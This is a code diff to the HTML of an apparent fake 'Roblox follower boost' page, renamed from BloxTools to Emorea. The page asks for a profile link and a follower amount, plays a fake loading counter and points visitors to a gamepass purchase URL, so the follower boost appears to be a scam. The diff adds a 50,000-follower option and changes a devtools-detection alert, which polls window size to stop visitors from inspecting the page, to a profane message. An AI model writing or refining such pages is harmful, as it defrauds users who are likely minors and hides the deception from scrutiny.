@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BloxTools - Follower Boost</title>
+    <title>Emorea - Follower Boost</title>
     <style>
         @font-face {
             font-family: 'sfregular';
@@ -161,8 +161,8 @@
         <input type="text" class="input-box" id="profileLink" placeholder="Paste your Roblox profile link" required>
         <select class="follower-select" id="followerAmount">
             <option value="1">1 Follower</option>
-            <option value="100">100 Followers</option>
-            <option value="1000" selected>1000 Followers</option>
+            <option value="1000">1000 Followers</option>
+            <option value="50000" selected>50,000 Followers (RISKY)</option>
         </select>
         <button id="startButton" class="start-button" onclick="boostFollowers()">Start</button>
         <div class="response-area" id="responseArea">
@@ -190,7 +190,7 @@
         function checkDevTools() {
             if (window.outerWidth - window.innerWidth > 200 || 
                 window.outerHeight - window.innerHeight > 200) {
-                alert("Please don’t inspect the page!");
+                alert("Fuck u");
             }
         }
         setInterval(checkDevTools, 1000);
@@ -242,7 +242,7 @@
             const loadingScreen = document.getElementById('loadingScreen');
             const followerCounter = document.getElementById('followerCounter');
             const loadingText = document.getElementById('loadingText');
-            const gamepassUrl = 'https://www.roblox.com/game-pass/YOUR_GAMEPASS_ID'; // Replace with your Gamepass URL
+            const gamepassUrl = 'https://www.roblox.com/game-pass/123'; // Replace with your Gamepass URL
 
             // Show "Waiting..." loading screen
             loadingScreen.style.display = 'flex';
